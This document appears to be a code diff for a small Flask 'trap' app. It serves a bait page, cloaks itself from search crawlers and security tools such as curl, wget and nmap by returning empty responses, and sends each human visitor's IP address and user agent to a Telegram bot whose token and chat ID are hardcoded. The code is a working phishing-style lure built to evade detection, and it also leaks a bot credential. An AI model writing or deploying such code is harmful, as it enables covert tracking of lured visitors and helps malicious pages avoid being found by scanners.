@@ -3,42 +3,41 @@ import requests
 
 app = Flask(__name__)
 
+# 🔐 Replace these with your actual bot token and chat ID
 BOT_TOKEN = "7590817261:AAGL6vH2hi4NPd9x1Iikaqlk40p5xxQ0cBc"
 CHAT_ID = "6908281054"
 
-# 🔒 Full List of bots to silently block
+# ❌ Blocked bots list
 bot_keywords = [
-    "google", "bot", "crawl", "spider", "archive", "slurp",
-    "bing", "facebook", "Headless", "python", "curl", "wget",
-    "Go-http-client", "axios", "postman", "scan", "nmap", "node"
+    "google", "bot", "crawl", "spider", "slurp", "bing", "facebook", "headless",
+    "python", "curl", "wget", "axios", "postman", "go-http-client", "scan", "nmap", "node"
 ]
 
 def is_bot(user_agent):
-    return any(bot in user_agent.lower() for bot in bot_keywords)
+    return any(keyword in user_agent.lower() for keyword in bot_keywords)
 
-def send_to_telegram(msg):
+def send_to_telegram(message):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    payload = {"chat_id": CHAT_ID, "text": message}
     try:
-        requests.post(
-            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-            data={"chat_id": CHAT_ID, "text": msg}
-        )
+        requests.post(url, data=payload)
     except:
         pass
 
-@app.route('/')
-def bait_page():
+@app.route("/")
+def trap():
     ua = request.headers.get('User-Agent', '')
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-    ref = request.headers.get("Referer", "")
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    referer = request.headers.get("Referer", "")
 
-    # 🛑 Block all known bots silently
-    if is_bot(ua) or any(s in ref for s in ['google.', 'bing.', 'yahoo.', 'duckduckgo.']):
-        return "", 204  # No Content
+    # ❌ Silent ignore for bots
+    if is_bot(ua) or any(ref in referer.lower() for ref in ['google.', 'bing.', 'yahoo.', 'duckduckgo.']):
+        return "", 204
 
-    # ✅ Real User Detected
-    send_to_telegram(f"🎯 *Trap Hit!*\n🌐 IP: {ip}\n📱 UA: {ua}")
-    return render_template('bait.html')
-  if __name__ == "__main__":
-    import os
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port)
+    # ✅ Human trap triggered
+    msg = f"🎯 *Trap Hit!*\n🌐 IP: {ip}\n📱 UA: {ua}"
+    send_to_telegram(msg)
+    return render_template("bait.html")
+
+if __name__ == "__main__":
+    app.run()
